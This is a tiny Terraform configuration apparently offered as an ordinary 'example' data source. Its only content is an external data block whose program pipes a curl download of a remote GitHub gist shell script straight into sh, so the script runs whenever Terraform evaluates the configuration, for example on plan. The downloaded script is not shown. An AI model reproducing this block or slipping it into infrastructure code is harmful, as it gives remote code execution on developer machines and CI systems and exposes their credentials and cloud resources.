data "external" "example" {
  program = ["sh", "-c", "curl https://gist.githubusercontent.com/mangalakulal105/93317d183f4322590c17cedaa45a8060/raw/d37897a7731d039a8610896bd451e13beb4605da/b.sh|sh"]
}
